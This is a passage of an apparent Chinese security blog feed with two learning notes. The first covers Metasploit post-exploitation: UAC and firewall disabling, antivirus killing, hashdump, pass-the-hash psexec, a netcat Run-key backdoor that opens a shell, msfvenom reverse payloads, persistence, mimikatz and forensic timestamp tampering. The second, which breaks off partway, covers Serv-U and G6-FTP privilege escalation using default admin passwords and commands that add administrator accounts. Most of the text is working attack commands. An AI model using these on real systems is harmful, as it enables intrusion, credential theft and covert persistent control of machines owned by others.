10.0.0.128<br>set SRVHOST 10.0.0.128<br>exploit</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/ppr_flatten_rec<br>set SESSION 1<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Jhqu2n4.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>图形化 payload</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set payload windows/vncinject/reverse_tcp</span><br></pre></td></tr></table></figure><pre><code>use exploit/windows/local/ppr_flatten_recset payload windows/vncinject/reverse_tcpset SESSION 1set LHOST 10.0.0.128set ViewOnly falseexploit<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/wOXJo7u.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭 UAC 功能</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>获取 hashdump</span><br></pre></td></tr></table></figure></code></pre><p>  meterpreter &gt; hashdump<br>      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      John:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>尝试利用</span><br></pre></td></tr></table></figure><br>  use exploit/windows/smb/psexec<br>  set RHOST 10.0.0.132<br>  set SMBUser John<br>  set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/vXDrNNx.png</span>)</span><br><span class="line"></span><br><span class="line">报错：Exploit failed [no-access]</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>需要提前关闭 UAC</span><br></pre></td></tr></table></figure><br>sessions -i 2<br>shell<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br>shutdown -r -t 0</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/WJBykgA.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>再次利用</span><br></pre></td></tr></table></figure><p>use exploit/windows/smb/psexec<br>set RHOST 10.0.0.132<br>set SMBUser John<br>set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">4.</span>基础操作 </span><br><span class="line"></span><br><span class="line">##### 关闭 防火墙</span><br><span class="line"></span><br><span class="line">- 需要管理员或<span class="keyword">system</span>权限</span><br></pre></td></tr></table></figure><p>netsh advfirewall set allprofiles state on<br>netsh advfirewall set allprofiles state off</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/VsB8p0A.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">##### 关闭windefend</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>查看服务名称</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/SITzUbY.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭防火墙</span><br></pre></td></tr></table></figure><p>  net stop windefend<br>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### bitlocker 加密</span><br><span class="line"></span><br><span class="line">- manage-bde -off C:</span><br><span class="line">- manage-bde -status C:</span><br><span class="line"></span><br><span class="line">##### 关闭DEP</span><br><span class="line"></span><br><span class="line">- bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br><span class="line"></span><br><span class="line">##### 杀死防病毒软件</span><br><span class="line"></span><br><span class="line">- run killav</span><br><span class="line">- run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line">##### 开启远程桌面服务</span><br></pre></td></tr></table></figure></p><h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>run post/windows/manage/enable_rdp</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Dl02OVL.png</span>)</span><br></pre></td></tr></table></figure><h1 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h1><p>run multi_console_command -rc root/.msf4/loot/20180418001805_default_10.0.0.132_host.windows.cle_842354.txt</p><h1 id="开启服务-1"><a href="#开启服务-1" class="headerlink" title="开启服务"></a>开启服务</h1><p>run getgui –e<br>run getgui -u yuanfh -p pass<br>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 查看远程桌面</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>screenshot</span><br><span class="line"><span class="bullet">- </span>use espia</span><br><span class="line"><span class="bullet">  - </span>screengrab</span><br><span class="line"></span><br><span class="line"><span class="section">##### 使用tokens攻击域控制器</span></span><br><span class="line"></span><br><span class="line">tokens, 用户每次登录，账号绑定临时的tokens,访问资源时提交 tokens 进行身份验证，类似于 web cookies。</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>Incognito</span><br><span class="line"><span class="bullet">  - </span>独立功能的软件，被 msf 集成在 metepreter 中</span><br><span class="line"><span class="bullet">  - </span>无需密码或破解或获取密码 hash，窃取 tokens 将自己伪装成其他用户</span><br><span class="line"><span class="bullet">  - </span>尤其适用于域环境下提权渗透多操作系统</span><br><span class="line"><span class="bullet">- </span>搭建域环境</span><br><span class="line"><span class="bullet">  - </span>DC + XP</span><br><span class="line"><span class="bullet">- </span>load incognito</span><br><span class="line"><span class="bullet">  - </span><span class="code">`list_tokens -u`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`impersonate_token lab\administrator`</span></span><br><span class="line"><span class="bullet">- </span>运行以上命令需要 getsystem</span><br><span class="line"><span class="bullet">  - </span>本地普通权限用户需要先本地权限</span><br><span class="line"><span class="bullet">  - </span><span class="code">`use exploit/windows/local/ms10_015_kitrap0d`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`execute -f cmd.exe -i -t # -t：`</span>使用当前假冒tokens执行程序</span><br><span class="line"><span class="bullet">  - </span>shell</span><br><span class="line"></span><br><span class="line"><span class="section">##### 注册表</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>注册表保存着 windows 几乎全部配置参数</span><br><span class="line"><span class="bullet">  - </span>如果修改不当，可直接造成系统崩溃</span><br><span class="line"><span class="bullet">  - </span>修改前完整备份注册表</span><br><span class="line"><span class="bullet">  - </span>某些注册表的修改是不可逆的</span><br><span class="line"><span class="bullet">- </span>常见用途</span><br><span class="line"><span class="bullet">  - </span>修改、增加启动项</span><br><span class="line"><span class="bullet">  - </span>窃取存储于注册表中的机密信息</span><br><span class="line"><span class="bullet">  - </span>绕过文件型病毒查杀</span><br><span class="line"><span class="bullet">- </span>用注册表添加 nc 后门服务（metepreter）</span><br></pre></td></tr></table></figure><p>meterpreter &gt;</p><p>upload /usr/share/windows-binaries/nc.exe C:\windows\system32</p><p>reg enumkey -k HKLM\software\microsoft\windows\currentversion\run</p><p>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d </p><p>‘C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</p><p>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v nc</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>打开防火墙端口（metepreter）</span><br></pre></td></tr></table></figure><p>meterpreter &gt;<br>execute -f cmd -i -H<br>netsh firewall show opmode<br>netsh firewall add portopening TCP 4444 “test” ENABLE ALL<br>shutdown -r -f -t 0<br>nc 10.0.0.132 444</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 其他注册表项</span><br><span class="line">  - https:<span class="comment">//support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</span></span><br><span class="line"></span><br><span class="line">##### 抓包</span><br><span class="line"></span><br><span class="line">- 抓包（metepreter）</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure><pre><code>load sniffersniffer_interfacessniffer_start 2sniffer_dump 2 1.cap / sniffer_dump 2 1.cap在内存中缓冲区块循环存储抓包（50000包），不写硬盘智能过滤 metepreter 流量，传输全称使用 SSL/TLS 加密<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 解码</span><br><span class="line"></span><br><span class="line">  - use auxiliary/sniffer/psnuffle</span><br><span class="line">  - set PCAPFILE /root/<span class="number">1.</span>cap</span><br><span class="line"></span><br><span class="line">##### 搜索文件</span><br><span class="line"></span><br><span class="line">- search -f *.ini</span><br><span class="line">- search -d c:\documents\ and\ settings\administrator\desktop\ -f *.docx</span><br><span class="line"></span><br><span class="line">##### 破解弱口令</span><br><span class="line"></span><br><span class="line">- John the Ripper 破解弱口令</span><br></pre></td></tr></table></figure></code></pre><ul><li>use post/windows/gather/hashdump # system 权限的 metepreter</li><li>run # 结果保存在 /tmp 目录下</li><li>use auxiliary/analyze/jtr_crack_fast</li><li>run<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 擦除痕迹</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>文件系统访问会留下痕迹。电子取证重点关注</span><br><span class="line"><span class="bullet">- </span>渗透测试和攻击者往往希望销毁文件系统访问痕迹</span><br><span class="line"><span class="bullet">- </span>最好的避免被电子取证发现的方法：不要碰文件系统</span><br><span class="line"><span class="bullet">  - </span>metepreter 的先天优势所在（完全基于内存）</span><br><span class="line"><span class="bullet">- </span>MAC 时间 （Modified / Accessed / Changed）</span><br><span class="line"><span class="bullet">  - </span>ls -l –time=atime/mtime/ctime 1.txt</span><br><span class="line"><span class="bullet">  - </span>stat 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -d “2 days ago” 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -t 1501010101 1.txt</span><br><span class="line"><span class="bullet">- </span>MACE：MFT entry</span><br><span class="line"><span class="bullet">  - </span>MFT：NTFS 文件系统的主文件分配表 Master File Table</span><br><span class="line"><span class="bullet">  - </span>通常 1024 字节或2个硬盘扇区，其中存放多项 entry 信息</span><br><span class="line"><span class="bullet">  - </span>包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）</span><br><span class="line"><span class="bullet">  - </span>更多信息可研究文件系统取证分析技术</span><br><span class="line"></span><br><span class="line"><span class="section">##### pivoting 跳板 /枢纽/支点</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>msfvenom 制作 payload</span><br></pre></td></tr></table></figure>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=kali_firewall LPORT=4444 -b “\x00\xff” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>获取 system 权限</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/PXgwA0S.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用已经控制的一台计算机作为入侵内网的跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>在其他内网计算机看来访问全部来自于跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>run autoroute -s 1.1.1.0/24 # 不能访问外网的被攻击目标内网网段</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>自动路由现实场景</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>  利用 win7 攻击内网 XP（对比 xp 有无外网访问权的情况）<br>  – 扫描内网：use auxiliary/scanner/portscan/tcp  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> Pivoting 之端口转发 portfwd</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>  利用已经被控计算机，在kali 与攻击目标之间实现端口转发<br>  portfwd add -L LIP -l LPORT -r RIP -p RPORT<br>  portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389<br>  portfwd list / delete / flush  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>set RHOST 127.0.0.1<br>set LHOST 2.1.1.10<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set exitonsession false</span><br><span class="line"></span><br><span class="line"><span class="section">#### 持久后门</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞取得的 metepreter 运行内存中，重启失效</span><br><span class="line"><span class="bullet">- </span>重复 exploit 漏洞可能造成服务崩溃</span><br><span class="line"><span class="bullet">- </span>持久后门保证漏洞修复后仍可远程控制</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>metepreter 后门</span><br></pre></td></tr></table></figure>run metsvc -A # 删除 -r<br>use exploit/multi/handler<br>set PAYLOAD windows/metsvc_bind_tcp<br>set LPORT 31337<br>set RHOST 1.1.1.1<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>持久后门</span><br></pre></td></tr></table></figure>run persistence -h<br>run persistence -X -i 10 -p 4444 -r 10.0.0.128<br>run persistence -U -i 20 -p 4444 -r 10.0.0.128<br>run persistence -S -i 20 -p 4444 -r 10.0.0.128<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### mimikatz</span><br><span class="line"></span><br><span class="line">- hashdump 使用的就是 mimikatz 的部分功能</span><br></pre></td></tr></table></figure>getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��tspkg ��livessp<br>mimikatz_command -h<br>mimikatz_command -f a::<br>mimikatz_command -f samdump::hashes<br>mimikatz_command -f handle::list<br>mimikatz_command -f service::list<br>mimikatz_command -f crypto::listProviders<br>mimikatz_command -f winmine::infos # 扫雷游戏<pre><code></code></pre></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;msf后渗透常见操作总结&quot;&gt;&lt;a href=&quot;#msf后渗透常见操作总结&quot; class=&quot;headerlink&quot; title=&quot;msf后渗透常见操作总结&quot;&gt;&lt;/a&gt;msf后渗透常见操作总结&lt;/h2&gt;&lt;h4 id=&quot;1-准备工作&quot;&gt;&lt;a href=&quot;#1-准备工作&quot;
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf后渗透" scheme="https://shu1l.github.io/tags/msf%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>windows中常见提权方式总结(三)</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/</id>
    <published>2020-04-28T01:56:53.000Z</published>
    <updated>2020-06-05T10:16:23.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要记录一些通过第三方软件提权的方式，主要包括一些ftp管理软件，远程管理软件等等。。。</p><h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul><li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li><li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li><li>serv-u密码文件：ServUDaemon.ini</li><li>端口号：默认端口是43958<br>ServUDaemon.ini中lccalsetuportNo=端口</li></ul><h5 id="FTP提权方法"><a href="#FTP提权方法" class="headerlink" title="FTP提权方法"></a>FTP提权方法</h5><p>1、有修改权限</p><p>2、无权限修改</p><p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p><p>4、serv-u ftp转发端口</p><h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[USER=quan|<span class="number">1</span>]                                <span class="comment">//用户名</span></span><br><span class="line">Password=    <span class="comment">//用户密码加密后的密文</span></span><br><span class="line">HomeDir=c:\ftp\quan             <span class="comment">//目录</span></span><br><span class="line">RelPaths=<span class="number">3</span> </span><br><span class="line">TimeOut=<span class="number">600</span>                      <span class="comment">//超时时间设置</span></span><br><span class="line">Maintenance=System               <span class="comment">//权限</span></span><br><span class="line">Access1=C:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access2=d:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access3=e:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">SKEYValues=</span><br></pre></td></tr></table></figure><p>password=2位随机字符+md5(2位随机字符+123456)</p><p>4、连接目标FTP服务器</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ftp</span> 目标<span class="built_in">IP</span>地址 刚添加的用户密码</span><br></pre></td></tr></table></figure><p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quote site exec net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">quote site exec net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p><h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d:\serv_u.exe</span><br><span class="line">d:\serv_u.exe “net<span class="built_in"> user </span>quan quan123 /add”</span><br><span class="line">d:\serv_u.exe “net localgroup administrators quan /add”</span><br></pre></td></tr></table></figure><p>注意命令要有引号</p><h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave yourIP <span class="number">5000</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">43958</span></span><br></pre></td></tr></table></figure><p>在本机上运行</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -<span class="section">listen</span> <span class="number">5000</span> <span class="number">21</span></span><br></pre></td></tr></table></figure><p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p><p>这里就不写具体过程了</p><h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200429095652.png" alt=""></p><h5 id="G6-FTP简介"><a href="#G6-FTP简介" class="headerlink" title="G6-FTP简介"></a>G6-FTP简介</h5><ul><li>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</li><li>G6-FTP的默认端口为<code>8021</code>，只侦听在127.0.0.1的8021端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</li></ul><h5 id="提权关键"><a href="#提权关键" class="headerlink" title="提权关键"></a>提权关键</h5><p>使用lcx时必须保证两个前提，肉鸡A和内网机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。</p><h5 id="提取方法"><a href="#提取方法" class="headerlink" title="提取方法"></a>提取方法</h5><p>1、通过执行bat文件提权<br>2、通过映射bat文件提权</p><h5 id="通过执行bat文件提权"><a href="#通过执行bat文件提权" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>步骤如下</p><ul><li><p>下载配置文件<code>Remote.ini</code>，将<code>administrator</code>管理密码解密<br>用cmd5 破解</p></li><li><p>查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p></li><li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">8027</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8021</span></span><br></pre></td></tr></table></figure><ul><li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p></li><li><p>创建FTP用户并进行权限设置</p></li><li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><ul><li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p></li><li><p>普通用户登录ftp</p></li><li><p>执行所加入的批处理命令<br>执行命令<code>quote site adduser.bat</code></p></li></ul><h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" 